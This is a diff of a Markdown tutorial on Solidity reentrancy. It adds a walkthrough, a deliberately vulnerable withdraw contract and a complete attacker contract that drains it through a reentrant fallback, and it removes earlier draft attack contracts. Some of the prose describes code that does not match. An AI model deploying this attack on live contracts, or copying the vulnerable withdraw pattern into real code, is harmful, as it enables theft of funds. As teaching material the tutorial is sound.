@@ -1,147 +1,72 @@
 # Re-Entrancy
 
-Reentrancy is a vulnerability that occurs when a contract calls an external contract, and the external contract calls back into the first contract before the first contract has finished executing. This can lead to unintended behavior and can be exploited by attackers to drain funds from the contract, for example.
+## Introduction
 
-There are two contracts Contract A and Contract B.
+<hr>
 
-Contract A : Contract A is a smart contract that holds user funds and allows users to withdraw them. It may contain functions for checking balances, transferring funds, and verifying that the sender of a transaction has sufficient funds. The structure of the contract's withdraw function is shown in the image below:
+Reentrancy is a vulnerability in smart contracts that occurs when a contract calls an external contract and the external contract calls back into the original contract before the original contract has completed its execution. This can create a loop where the same function is executed repeatedly, potentially leading to unintended consequences such as transferring more funds than intended, locking up the contract, or other unexpected behavior.
 
-re-entrance-1.jpg
+## Understanding Reentrancy
+
+<hr>
+
+To understand how reentrancy works, let's consider a simple example. 
+
+Suppose we have two contracts: Contract A and Contract B.
+
+Contract A : Contract A is a smart contract that holds user funds and allows users to withdraw them. It contain functions for checking balances, transferring funds, and verifying that the sender of a transaction has sufficient funds. The general structure of the contract's withdraw function is shown in the image below:
+
+<center><img class="image w30" src="./assets/images/re-entrance-1.jpg"></center>
+<b><center class="img-label">Contract A</center></b>
 
 According to the image, `Contract A` has `50 Ether` in funds. The `withdraw()` function first checks whether the user's balance is greater than `zero`. If it is, the contract sends the associated funds to the user and sets the user's balance to zero. For example, let's say `Bob` has a balance of `20 Ether` stored in this contract and wants to withdraw his funds. He can use the contract's `withdraw` function to request the funds. The function will check if `Bob` has a balance stored in the contract (he does, with 20 Ether). The contract will then send the balance back to `Bob`, reducing the contract's balance to `30 Ether` (`50 Ether` minus `20 Ether`). Finally, the contract sets Bob's balance to `zero`. This is how the withdraw function works.
 
-Now lets see how contract B can use the re-entrancy to exploit withdraw function of contract A:
+Now Let's examine how Contract B, an attacker contract, can exploit the Contract A's withdraw function:
 
-Contract function need to be two functions first is fallback function and function name attack. BOth function going to call the widthdraw function inside contract A. Now the execution of it work like this:
+Contract B has two functions: a `fallback function` and a function called `attack`. Both functions call the `withdraw` function within Contract A. At the beginning of the attack, Contract A has zero Ether in funds. The general structure of the contract's attack and fallback function is shown in the image below:
 
-First Alice call the attack function, this will cal the withdraw function inside the contractg A.
-first Eid caused attack function this call the withdrawal function inside contract A since contract B is the caller here it checks that the balance of contract B is greater than 0 and it is since here contract B as one either so it sends that one either back to contract B. and when it does inside contract B it triggers the fallback function so now contract B as one ether and contact A has nine either now the fallback function inside contract B calls back into the withdrawal function inside contact A and then it checks the balance of contract B this is the balance of contract be greater than 0 if you look above you can see that the balance of contract B is still one either so this check passes and it sends another eater back to contract B which triggers the fallback function and now contract B has two eaters and contract a has eight eaters while the balance of contract be inside contract a is still equal to one liter so this means that while the balance of contract B is now updated it can keep withdrawing either from contract a and this could keep on going since the balance is updated on the last line of the withdrawal function but it is not reached since it keeps on looping between the fallback function and the withdrawal function and this is how contract beat and keep on withdrawing eater.
+<center><img class="image w30" src="./assets/images/re-entrancy-1a.jpg"></center>
+<b><center class="img-label">Contract B</center></b>
 
+The execution of these functions works as follows:
 
-The withdraw() function of Contract A allows users to retrieve their stored funds if they have a balance greater than zero. For example, let's say Bob has a balance of 20 Ether in Contract A and wants to withdraw his funds. He can use the withdraw() function, which will check that Bob has a balance in the contract and then send it back to him. This will reduce the balance of Contract A by 20 Ether, bringing it down to 30 Ether, and set Bob's balance to zero.
+**1.**  Assuming Alice deposited 10 ether to Contract A through Contract B, Contract A is aware that Contract B has 10 ether. Subsequently, Alice calls the `attack()` function, which calls the `withdraw()` function in `Contract A`. Contract A verifies that Contract B address has a balance greater than zero as a condition to proceed with the function call.
 
-Contract B can exploit the withdraw() function of Contract A through a technique called re-entrancy. Contract B has two functions: a fallback function and a function called `attack`. Both of these functions will call the `withdraw()` function within `Contract A`. and contract A have 10 ether funds of contract B. and Contract B has balance zero.
+<center><img class="image w90" src="./assets/images/re-entrance-2.jpg"></center>
+<b><center class="img-label">Calling attack() function</center></b>
 
-Here's how the attack will work: 
+Contract A confirms that Contract B has a balance greater than zero (which is 10 Ether), and proceeds with the function call. Contract A then sends the 10 Ether back to Contract B, which triggers the fallback function of contract B.
 
-re-entrance-2.jpg
+<center><img class="image w90" src="./assets/images/re-entrance-3.jpg"></center>
+<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>
 
-Alice calls the` attack()` function, which in turn calls the `withdraw()` function in `Contract A`. `Contract A` checks that `Contract B` has a `balance` greater than `zero`.
+At this point, the current state of the contracts is that Contract B has a balance of 10 Ether, while the balance of Contract A is reduced to 40 Ether. However, it is important to note that the execution of Contract B's fallback function is still pending, and the execution of Contract A's withdraw() function is also pending (Due to this the balance of Contract B in the contract A state remains at 10 Ether).
 
-re-entrance-3.jpg
+The fallback function of Contract B invokes the withdraw() function in Contract A once more. Upon invocation, Contract A verifies that Contract B's balance is still greater than zero, which is true (It currently holds 10 Ether), and proceeds to transfer an additional 10  to Contract B.
 
-Which it does (it has 10 Ether), and sends it back to Contract B when it does inside contract B it triggers the fallback function and now contract B has 10 ether. thorugh which now contract B has 10 ether and contract A reduces the balance to 40 ether.
+<center><img class="image w90" src="./assets/images/re-entrance-4.jpg"></center>
+<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>
 
-re-entrance-4.jpg
+At this point, the current state of the contracts is that Contract B has a balance of 20 Ether, while the balance of Contract A is reduced to 30 Ether. Tt is important to note that the execution of Contract B's fallback function is again still pending, and the execution of Contract A's withdraw() function is also pending.
 
-the fallback function of contract B calls the withdraw() function in Contract A again. Contract A again checks that Contract B has a balance greater than zero, which it does (it now has 10 Ether still), and sends it another Ether.
+This cycle can repeat, with the fallback function in Contract B repeatedly calling the withdraw() function in Contract A. Each time this happens, Contract A sends additional funds to Contract B, causing the balance of Contract A to decrease and Contract B's balance to increase. This is how Contract B can continuously exploit the withdraw() function of Contract A.
 
-re-entrance-5.jpg
+<center><img class="image w90" src="./assets/images/re-entrance-5.jpg"></center>
+<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>
 
-Now contract has 20 ether and contract A have 30 ether.
+In this attack, Contract B repeatedly calls the withdraw function of Contract A in a loop without waiting for the previous transaction to complete. As a result, the balance of the user in Contract A is not updated before the next withdrawal, allowing the attacker to repeatedly withdraw funds from Contract A.
 
-This process can repeat, with the fallback function in Contract B calling the withdraw() function in Contract A over and over. Each time, Contract A sends more funds to Contract B, and the balance of Contract A decreases, while Contract B's balance increases. This is how Contract B can continuously exploit the withdraw() function of Contract A.
+In conclusion, a reentrancy attack is a type of vulnerability that can occur in smart contracts when a contract is allowed to call back into itself or another contract before the first invocation has completed. This can be exploited by attackers to repeatedly execute a vulnerable function and drain funds from the contract.
 
+## POC
 
-Contract B: 
+<hr>
 
 ```sol
 // SPDX-License-Identifier: GPL-3.0
-pragma solidity 0.8.17;
+pragma solidity ^0.8.19;
 
-//checking  How much function stack stores?
-// contract A{
-//     uint public count;
-//     function fun() public {
-//         uint a;
-//     }
-
-//     function fun2() public{
-//         count++;
-//             fun();
-//     }
-// }
-// contract A{
-//     function deposit() public payable{
-
-//     }
-    
-//     function withdraw() public {
-//         uint amount = 2 ether;
-//         payable(msg.sender).transfer(amount);
-//     }
-// }
-
-// contract B {
-//     A public contractA;
-//     constructor(address _addr) {
-//         contractA = A(_addr);
-//     }
-
-//     fallback() external payable{
-
-//     }
-
-//     function attack() public{
-//         contractA.withdraw();
-//     }
-// }
-
-//working below
-// contract EtherStore {
-//     mapping(address => uint) public balances;
-
-//     function deposit() public payable {
-//         balances[msg.sender] += msg.value;
-//     }
-
-//     function withdraw() public {
-//         uint bal = balances[msg.sender];
-//         require(bal > 0);
-
-//         (bool sent, ) = msg.sender.call{value: bal}("");
-//         require(sent, "Failed to send Ether");
-
-//         balances[msg.sender] = 0;
-//     }
-
-//     // Helper function to check the balance of this contract
-//     function getBalance() public view returns (uint) {
-//         return address(this).balance;
-//     }
-// }
-
-// contract Attack {
-//     uint public count;
-//     EtherStore public etherStore;
-
-//     constructor(address _etherStoreAddress) {
-
-//         etherStore = EtherStore(_etherStoreAddress);
-//     }
-
-//     // Fallback is called when EtherStore sends Ether to this contract.
-//     fallback() external payable {
-//         if (address(etherStore).balance >= 1 ether && count<=5) {
-//             count++;
-//             etherStore.withdraw();
-//         }
-//     }
-
-//     function attack() external payable {
-//         require(msg.value >= 1 ether);
-//         etherStore.deposit{value: 1 ether}();
-//         etherStore.withdraw();
-//     }
-
-//     // Helper function to check the balance of this contract
-//     function getBalance() public view returns (uint) {
-//         return address(this).balance;
-//     }
-// }
-//Working above:
-
-contract EtherStore {
+contract VulnerableContract {
     mapping(address => uint) public balances;
 
     function deposit() public payable {
@@ -149,347 +74,144 @@ contract EtherStore {
     }
 
     function withdraw() public {
-        uint bal = balances[msg.sender];
-        require(bal > 0);
+        require(balances[msg.sender] >= 0, "Insufficient balance");
 
-        // payable(msg.sender).transfer(bal); //Not working
-        (bool sent, ) = msg.sender.call{value: bal}("");
-        require(sent, "Failed to send Ether");
+        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
+        require(success, "Transfer failed");
 
         balances[msg.sender] = 0;
     }
 
-    // Helper function to check the balance of this contract
     function getBalance() public view returns (uint) {
-        return address(this).balance;
+        return balances[msg.sender];
     }
 }
+```
 
-contract Attack {
-    uint public count;
-    EtherStore public etherStore;
+This is a simple smart contract called VulnerableContract that allows users to deposit and withdraw ether. The contract has three functions:
 
-    constructor(address _etherStoreAddress) {
+**1. deposit():** This function allows anyone to deposit ether into the contract. The amount of ether deposited by the sender is added to their balance in the balances mapping.
 
-        etherStore = EtherStore(_etherStoreAddress);
+**2. withdraw(uint amount):** This function allows a user to withdraw a specified amount of ether from their balance in the balances mapping. It first checks if the user has a sufficient balance to withdraw the specified amount by using the require statement. If the user has sufficient balance, the function attempts to transfer the specified amount of ether to the user's address using the call function. If the transfer is successful, the specified amount is subtracted from the user's balance in the balances mapping.
+
+**3. getBalance():** This function allows a user to check their balance in the balances mapping. It returns the balance of the caller (the address that calls the function).
+
+Note that this contract is vulnerable to a reentrancy attack. If an attacker were to call the withdraw() function from a malicious contract that implements a fallback or receive function that calls back into the vulnerable contract, the attacker could repeatedly call the withdraw() function and drain the contract's balance. 
+
+Now we will create a POC of the VulnerableContract that exploits its vulnerability to a reentrancy attack. We will then use the POC to demonstrate how the vulnerability can be exploited to drain the contract's balance.
+
+To create the AttackerContract, we first need to create an instance of the VulnerableContract. We do this by passing the address of the deployed VulnerableContract to the constructor of the AttackerContract.
+
+```sol
+contract AttackerContract {
+    VulnerableContract vulnerableContract;
+
+    constructor(VulnerableContract _vulnerableContract) {
+        vulnerableContract = VulnerableContract(_vulnerableContract);
     }
+}
+```
+Next, we need to create a fallback function that is called whenever someone sends ether to the AttackerContract. In this fallback function, we check if the balance of the VulnerableContract is greater than or equal to 1 ether. If it is, we call the withdraw function of the VulnerableContract.
 
-    // Fallback is called when EtherStore sends Ether to this contract.
+```sol
     fallback() external payable {
-        if (address(etherStore).balance >= 1 ether && count<=5) {
-            count++;
-            etherStore.withdraw();
+        if (address(vulnerableContract).balance >= 1 ether) {
+            vulnerableContract.withdraw();
         }
     }
+```
 
-    function deposit() public payable{
+The fallback function in the AttackerContract is payable, which means that it can receive ether when it is called. This is important because the AttackerContract needs to be able to receive ether in order to deposit it into the VulnerableContract and then withdraw it repeatedly. The reason we create a fallback function in the AttackerContract is that it is called automatically when ether or calldata is sent to the contract, allowing us to exploit the vulnerability without explicitly calling the withdraw function.
 
+Finally, we need to create an attack function that deposits 1 ether to the VulnerableContract and then calls the withdraw function of the VulnerableContract. 
+
+Since the balance of a newly created account in VulnerableContract is 0, if we were to call the withdraw function without first depositing any funds, the require statement would prevent us from withdrawing any ether. Therefore, we need to deposit some ether into the contract to satisfy the require statement and pass the check. In this particular case, we are depositing 1 ether, but the amount could be any positive number greater than 0 to satisfy the check. 
+
+```sol
+    function attack() public payable {
+        vulnerableContract.deposit{value: 1 ether}();
+        vulnerableContract.withdraw();
     }
+```
 
-    function depositD() public payable{
-        etherStore.deposit{value: msg.value}();
-        // etherStore.deposit(); // this will not work. if you want to send msg.value to another contract 
-    }
+The attack function can be called by anyone, and it will drain the balance of the VulnerableContract if it has at least 1 ether.
+We can also create a getBalance function to check the balance of the AttackerContract.
 
-    function attack() external payable {
-        etherStore.withdraw();
-    }
+The attack() function is marked as payable because it receives ether as a parameter when it is called. 
 
-    // Helper function to check the balance of this contract
+In this case, the attack() function sends 1 ether to the VulnerableContract using the deposit() function, which is a payable function. Therefore, the attack() function must be marked as payable to receive the 1 ether that is being sent to it.
+
+By marking the function as payable, we are allowing it to receive ether and we can then use that ether to call the deposit() function of the VulnerableContract and deposit 1 ether into the contract before calling the withdraw() function.
+
+So, marking the attack() function as payable is necessary in this case because it receives ether that is used to interact with the VulnerableContract and perform the intended attack.
+
+```sol
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
 }
-
-//Not working becuz of count++ , if you remove it works.
-// contract EtherStore {
-//     mapping(address => uint) public balances;
-
-//     function deposit() public payable {
-//         balances[msg.sender] += msg.value;
-//     }
-
-//     function withdraw() public {
-//         uint bal = balances[msg.sender];
-//         require(bal > 0,"balance does not exist!");
-//         payable(msg.sender).transfer(bal);
-//         balances[msg.sender] = 0;
-//     }
-
-//     function getBalance() public view returns (uint) {
-//         return address(this).balance;
-//     }
-// }
-
-// contract Attack {
-//     uint public count = 0;
-//     EtherStore public etherStore;
-
-//     constructor(address _etherStoreAddress) {
-//         etherStore = EtherStore(_etherStoreAddress);
-//     }
-
-//     fallback() external payable {
-//         if (address(etherStore).balance >= 1) {
-//             count++;
-//         }
-//     }
-
-//     function attack() external payable {
-//         require(msg.value >= 1 ether);
-//         etherStore.deposit{value: 1 ether}();
-//         etherStore.withdraw();
-//     }
-
-//     function getBalance() public view returns (uint) {
-//         return address(this).balance;
-//     }
-// }
-
-// contract EtherStore {
-//     mapping(address => uint) public balances;
-//     function deposit() public payable {
-//         balances[msg.sender] += msg.value;
-//     }
-
-//     function withdraw() public {
-//         uint bal = balances[msg.sender];
-//         require(bal > 0,"balance is not");
-
-//         payable(msg.sender).transfer(bal);
-//         // (bool sent, ) = msg.sender.call{value: bal}("");
-//         // require(sent, "Failed to send Ether");
-
-//         balances[msg.sender] = 0;
-//     }
-
-//     function withdraw2() public {
-//         uint bal = balances[msg.sender];
-//         require(bal > 0,"you do not have baance");
-
-//         payable(msg.sender).transfer(bal);
-//         // (bool sent, ) = msg.sender.call{value: bal}("");
-//         // require(sent, "Failed to send Ether");
-
-//         balances[msg.sender] = 0;
-//     }
-
-//     // Helper function to check the balance of this contract
-//     function getBalance() public view returns (uint) {
-//         return address(this).balance;
-//     }
-// }
-
-// contract Attack {
-//     EtherStore public etherStore;
-//     uint a = 0;
-
-//     constructor(address _etherStoreAddress) {
-//         etherStore = EtherStore(_etherStoreAddress);
-//     }
-
-//     // Fallback is called when EtherStore sends Ether to this contract.
-//     fallback() external payable {
-//         if (address(etherStore).balance >= 1 ether && a <= 2) {
-//             etherStore.withdraw();
-//         }
-//         a++;
-        
-//     }
-
-//     function d() public payable{
-
-//     }
-
-//     function deposit() public{
-//         etherStore.deposit{value: 1 ether}();
-//     }
-
-//     function attack() public payable{
-//         etherStore.withdraw();
-//     }
-
-//     // function attack2() public {
-//     //     // require(msg.value >= 1 ether);
-//     //     // etherStore.deposit{value: 1 ether}();
-//     //     etherStore.withdraw2();
-//     // }
-
-
-//     // // Helper function to check the balance of this contract
-//     // function getBalance() public view returns (uint) {
-//     //     return address(this).balance;
-//     // }
-// }
-
-// // contract FundStore{
-// //     mapping(address => uint) public funds;
-
-// //     function deposit() public payable{
-// //         require(msg.value>0,"ether should be grater than zero");
-// //         funds[msg.sender] += msg.value;
-// //     }
-
-// //     function withdraw() public{
-// //         require(funds[msg.sender] > 0, "You do not have any funds");
-// //         payable(msg.sender).transfer(funds[msg.sender]);
-// //         funds[msg.sender] = 0;
-// //     }
-
-// // }
-
-// // contract Attack{
-// // //    function receive(address _addr) external payable {
-// // //         (bool sucess,) = _addr.call(abi.encodeWithSignature("withdraw()"));
-// // //     }
-// //     FundStore fs = new FundStore();
-// //     fallback() external payable{
-// //         fs.withdraw();
-// //     }
-
-// //     receive() payable external{
-
-// //     }
-// //     // function deposit(uint amount,address _addr) public{
-// //     //     // f.deposit(a);
-// //     //     amount = amount * 1 ether;
-// //     //     (bool sucess,) = _addr.call{value: amount}(abi.encodeWithSignature("deposit()"));
-// //     // }
-
-// //     function attack() public payable{
-// //         // (bool sucess,) = _addr.call(abi.encodeWithSignature("withdraw()"));
-// //         fs.deposit{value : 1 ether}();
-// //         fs.withdraw();
-// //     }
-
-
-// // }
-
-// // to transfer u dont need payable function 
-// // deposit money using msg.value
-// // tranfer money using call low level function
-// // How to update the contract balance in a function 
-// when you call deposit of contract A, you should specify the {value: 1 ether} otherwise you getting error, remix value portion will not work.
-
 ```
 
-```
-contract A {
-    address public contractB;
-    constructor(address _addr){
-        contractB = _addr;
-    }
+In conclusion, the AttackerContract POC demonstrates how a simple vulnerability in a smart contract can be exploited to drain the contract's balance. It is important for developers to thoroughly test and audit their smart contracts to ensure that they are secure and free from vulnerabilities.
 
-    function deposit() public payable {
-    }
+Final AttackerContract
 
-    function withdraw() public {
-        uint bal = 1 ether;
-        payable(contractB).transfer(bal);
-    }
-}
-
-contract B {
-    uint public count;
-    fallback() external payable {
-        count = 1;
-    }
-}
-```
-Follow the following steps:
-1. Deploy `contract B`.
-2. Deploy `contract A` by passing the address of `contract B` as a constructor argument.
-3. Send more than `1 ether` to `contract A` using the `deposit` function.
-4. Call the `withdraw` function in `contract A` which transfers `1 ether` to `contract B` using the `transfer` function.
-5. Observe that the `transaction` fails 
-
-what's the reason for the failure?
-
-By doing some minor changes in code, transcation is succussfull. 
-**scenerio 1:**
-
-- Replace the `transfer` function in the `withdraw` function of `contract A` with the `call` function.
 ```sol
-function withdraw() public {
-    uint bal = 1 ether;
-    // payable(contractB).transfer(bal);
-    (bool sent, ) = msg.sender.call{value: bal}("");
-}
-```
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.19;
 
-- Repeat `steps 1-4` and observe that the `transaction` is successful.
-- Observe that the `transaction` success by using just a `call` function.
+contract AttackerContract {
+    VulnerableContract vulnerableContract;
 
-**scenerio 2:**
-- Use `trasfer` function again in the `withdraw` function (remove call function that we have update in scenerio 1).
-- Remove the `count` increment in the `fallback` function of `contract B`.
-- Repeat `steps 1-4` and observe that the transaction is successful.
-
-As per above two scenerios i observe that if we use taransaction function to send the funds from contract A to contract B. then we can not update the state variable. But i did not find any concept on solidity documentation.
-
-Please explain what i am missing here?
-
-
-
-scenario 2:
-Replace the transaction function to `call` low-level function.  Now the updated code is following
-```
-contract A {
-    address public contractB;
-    constructor(address _addr){
-        contractB = _addr;
+    constructor(VulnerableContract _vulnerableContract) {
+        vulnerableContract = VulnerableContract(_vulnerableContract);
     }
-
-    function deposit() public payable {
-    }
-
-    function withdraw() public {
-        uint bal = 1 ether;
-        // payable(contractB).transfer(bal);
-        (bool sent, ) = msg.sender.call{value: bal}("");
-    }
-}
-
-contract B {
-    uint public count;
+    
     fallback() external payable {
-        count = 1;
+        if (address(vulnerableContract).balance >= 1 ether) {
+            vulnerableContract.withdraw();
+        }
     }
-}```
-Follow the steps of scenario 1. Now the `Tx` has been successful. Why?
-
-scenario 3:
-1. Remove the count = 1 from fallback function. Now the code is:
-```
-contract A {
-    address public contractB;
-    constructor(address _addr){
-        contractB = _addr;
+     
+    function attack() public payable {
+        vulnerableContract.deposit{value: 1 ether}();
+        vulnerableContract.withdraw();
     }
 
-    function deposit() public payable {
-    }
-
-    function withdraw() public {
-        uint bal = 1 ether;
-        payable(contractB).transfer(bal);
-    }
-}
-
-contract B {
-    uint public count;
-    fallback() external payable {
-        // count = 1;
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
     }
 }
 ```
 
-2. And follow the steps in scenario 1.
-Now `Tx` has been successful. why? GOT the ansers:  **It have a hardcoded 2300 gas limit, which doesn't allow any fallback/functions to execute**
+## Exploit
+
+Fist Deploy Vunrable Contract
+Add Some money with different accounts
+
+Deploy Attacker Contract 
+And exploit
+
+Send VS Transfer VS Call:
+
+## Preventative Techniques
 
 
-//https://stackoverflow.com/questions/67722470/reentrancy-hack-in-solidity-no-longer-working-on-pragma-0-8-0
+To avoid re-entrancy, you can use the Checks-Effects-Interactions pattern as outlined further below:
+
+Re-entrancy is not limited to Ether transfers, but can occur with any function call on another contract. This means that when a contract calls a function on another contract, that contract can potentially call back into the original contract before the original function call has completed. This can create a loop that allows an attacker to repeatedly execute the same code and potentially modify the state of the contract in unintended ways.
+
+In addition to considering re-entrancy risks in single-contract situations, it's also important to take multi-contract situations into account. As you mentioned, a called contract could modify the state of another contract that the original contract depends on. This can create additional security risks and vulnerabilities that need to be carefully considered and addressed.
+
+To mitigate the risk of re-entrancy attacks, developers can use various techniques such as using the "checks-effects-interactions" pattern, which involves checking for conditions and performing all necessary state changes before interacting with other contracts. Additionally, developers can use mutex locks or other mechanisms to prevent multiple re-entrant calls from occurring simultaneously. Overall, it's important to carefully consider the potential risks and use best practices to ensure that smart contracts are secure and resistant to attacks.
+
+https://stackoverflow.com/questions/67722470/reentrancy-hack-in-solidity-no-longer-working-on-pragma-0-8-0
 
 list of bugs , POCs
 
 https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/
+
+# Reentrancy Attack Case Studies
+
+
+# Reentrancy Attack Hall of Shame
